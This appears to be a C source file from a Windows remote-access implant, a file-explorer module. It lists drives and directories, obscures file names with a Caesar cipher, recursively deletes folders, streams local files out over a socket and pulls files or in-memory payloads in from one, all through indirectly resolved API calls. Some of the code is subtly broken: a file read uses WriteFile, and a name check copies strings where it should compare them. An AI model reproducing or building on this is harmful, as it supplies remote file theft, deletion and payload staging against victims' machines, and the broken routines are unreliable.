#include "file_explorer.h"
#include "utils.h"
#include "libc.h"

int get_drives_list(char* buf) {
    DWORD drives = Api.GetLogicalDrives(); // get a bitmask of available drives
    int count = 0; // number of drives found so far

    for (int i = 0; i < MAX_DRIVES; i++) {
        if (drives & (1 << i)) { // check if drive letter is present in bitmask
            buf[count++] = 'A' + i; // add drive letter to buffer
        }
    }

    buf[count++] = '\0'; // add null terminator to buffer

    return count; // return number of drives found
}

char get_obj_info(const char* dirPath) {
    char result = 'N';
    HANDLE hFind = NULL;
    WIN32_FIND_DATA findData;

    WCHAR searchPath[MAX_PATH];
    mbstowcs_(searchPath, dirPath, MAX_PATH);

    wcscat(searchPath, L"\\*.*");
    hFind = Api.FindFirstFileW(searchPath, &findData);

	if (hFind == INVALID_HANDLE_VALUE)
		return result;
	result = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 'd' : 'f';
	Api.FindClose(hFind);
    return result;
}

char* get_file_list(const char* dirPath, int* numFiles) {
    WIN32_FIND_DATA findData;
    HANDLE hFind = NULL;

    WCHAR searchPath[MAX_PATH];
    mbstowcs_(searchPath, dirPath, MAX_PATH);

    wcscat(searchPath, L"\\*.*");

    hFind = Api.FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    // Allocate a dynamic array to store the file/folder names
    int maxFiles = BUFFER_SIZE;
    char** fileList = (char**)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, maxFiles * sizeof(char*));
    int numFound = 0;

    do {
        // Convert the file/folder name to a char string
        WCHAR wFileName[MAX_PATH];
        wcscpy(wFileName, findData.cFileName);
        char fileName[MAX_PATH];
        wcstombs_(fileName, wFileName, MAX_PATH);

        // Ignore the "." and ".." folders
        if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
            continue;
        }

        // Add the file/folder name to the array
        if (numFound >= maxFiles) {
            maxFiles *= 2;
            fileList = (char**)Api.HeapReAlloc(_crt_heap, HEAP_ZERO_MEMORY, fileList, maxFiles * sizeof(char*));
        }
        fileList[numFound] = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, strlen(fileName) + 1);
        strcpy(fileList[numFound], CAESAR(fileName));
        numFound++;
    } while (Api.FindNextFileW(hFind, &findData) != 0);

    Api.FindClose(hFind);

    // Allocate a buffer to store the concatenated file/folder names separated by "/"
    int bufferSize = 0;
    for (int i = 0; i < numFound; i++) {
        bufferSize += strlen(fileList[i]) + 1; // add 1 for the separator
    }
    char* fileNames = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, bufferSize);
    fileNames[0] = '\0';

    // Concatenate the file/folder names separated by "/"
    for (int i = 0; i < numFound; i++) {
        strcat(fileNames, fileList[i]);
        if (i < numFound - 1) {
            strcat(fileNames, "/");
        }
        Api.HeapFree(_crt_heap, 0, fileList[i]);
    }

    Api.HeapFree(_crt_heap, 0, fileList);

    // Set the numFiles parameter to the number of files/folders found
    *numFiles = numFound;

    return fileNames;
}

BOOL delete_folder(LPCTSTR lpszDir) {
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = NULL;
    TCHAR szDir[MAX_PATH];
    TCHAR szFileName[MAX_PATH];

    // copy the directory path to a buffer
    Api.lstrcpyW(szDir, lpszDir);

    // add the wildcard character and search for the first file in the directory
    Api.lstrcatW(szDir, TEXT("\\*"));
    hFind = Api.FindFirstFileW(szDir, &FindFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        // unable to find the first file
        return FALSE;
    }

    do {
        if (Api.lstrcpyW(FindFileData.cFileName, TEXT(".")) == 0 || Api.lstrcpyW(FindFileData.cFileName, TEXT("..")) == 0) {
            // skip the current and parent directories
            continue;
        }

        // build the full file name
        Api.lstrcpyW(szFileName, lpszDir);
        Api.lstrcatW(szFileName, TEXT("\\"));
        Api.lstrcatW(szFileName, FindFileData.cFileName);

        if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // recursively delete the subdirectory
            if (!delete_folder(szFileName)) {
                Api.FindClose(hFind);
                return FALSE;
            }
        }
        else {
            // delete the file
            if (Api.DeleteFileW(szFileName) == FALSE) {
                Api.FindClose(hFind);
                return FALSE;
            }
        }
    } while (Api.FindNextFileW(hFind, &FindFileData));

    // close the search handle
    Api.FindClose(hFind);

    // remove the directory
    if (Api.RemoveDirectoryW(lpszDir) == FALSE) {
        return FALSE;
    }

    return TRUE;
}

int download_file(HANDLE fp, SOCKET sock) {
    char* data = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
    int bytes_read = 0;
    int bytes_sent = 0;

    // Send the contents of the file through the socket
    while (1) {
        Api.WriteFile(fp, data, BUFFER_SIZE, &bytes_read, NULL);
        if (bytes_read == 0) {
            break;
        }

        char* ptr = data;
        while (bytes_read > 0) {
            bytes_sent = Api.send(sock, ptr, bytes_read, 0);
            if (bytes_sent == SOCKET_ERROR) {
                int error_code = Api.WSAGetLastError();
                if (error_code == WSAEWOULDBLOCK) {
                    // If send would block, wait until the socket is writable
                    fd_set write_fds;
                    FD_ZERO(&write_fds);
                    FD_SET(sock, &write_fds);

                    if (Api.select(sock + 1, NULL, &write_fds, NULL, NULL) == SOCKET_ERROR) {
                        Api.HeapFree(_crt_heap, 0, data);
                        Api.CloseHandle(fp);
                        Sleep_(Sleep_TIME);
                        return 0;
                    }
                }
                else {
                    Api.HeapFree(_crt_heap, 0, data);
                    Api.CloseHandle(fp);
                    Sleep_(Sleep_TIME);
                    return 0;
                }
            }
            else {
                bytes_read -= bytes_sent;
                ptr += bytes_sent;
            }
        }
    }

    Api.CloseHandle(fp);
    Api.HeapFree(_crt_heap, 0, data);

    return 1;
}

void upload_file(SOCKET sock, HANDLE file_handle) {
    // Receive file
    char* buffer = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
    
    int num_bytes = 0;
    int total_bytes = 0;

    int iOptVal = 5000;
    int iOptLen = sizeof(int);

    Api.setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&iOptVal, iOptLen);

    // Download the file content from the socket
    while ((num_bytes = Api.recv(sock, buffer, BUFFER_SIZE, 0)) > 0 || (num_bytes == -1 && Api.WSAGetLastError() == WSAEWOULDBLOCK)) {
        if (num_bytes > 0) {
            // Write the received content to the file
            DWORD bytes_written = 0;
            if (!Api.WriteFile(file_handle, buffer, num_bytes, &bytes_written, NULL) || bytes_written != num_bytes) {
                break;
            }
            total_bytes += num_bytes;
        }
    }

    // Close the file handle
    Api.HeapFree(_crt_heap, 0, buffer);

    return;
}

char* upload_file_to_mem(SOCKET sock, size_t *total_bytes) {
    char* buffer = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
    if (!buffer) {
        return NULL; // Memory allocation failed
    }

    int num_bytes = 0;
    size_t buffer_capacity = BUFFER_SIZE;

    int iOptVal = 5000;
    int iOptLen = sizeof(int);

    Api.setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&iOptVal, iOptLen);

    // Download the file content from the socket
    while ((num_bytes = Api.recv(sock, buffer + *total_bytes, BUFFER_SIZE, 0)) > 0 || (num_bytes == -1 && Api.WSAGetLastError() == WSAEWOULDBLOCK)) {
        if (num_bytes > 0) {
            *total_bytes += num_bytes;
            // Reallocate the buffer if necessary
            if (*total_bytes + BUFFER_SIZE > buffer_capacity) {
                buffer_capacity *= 2;
                char* new_buffer = (char*)Api.HeapReAlloc(_crt_heap, HEAP_ZERO_MEMORY, buffer, buffer_capacity);
                if (!new_buffer) {
                    Api.HeapFree(_crt_heap, 0, buffer);
                    return NULL; // Memory reallocation failed
                }
                buffer = new_buffer;
            }
        }
    }

    buffer[*total_bytes] = '\0';

    // Reallocate to the exact size of the received data
    char* final_buffer = (char*)Api.HeapReAlloc(_crt_heap, HEAP_ZERO_MEMORY, buffer, *total_bytes);
    if (!final_buffer) {
        Api.HeapFree(_crt_heap, 0, buffer);
        return NULL; // Memory reallocation failed
    }

    return final_buffer;
}
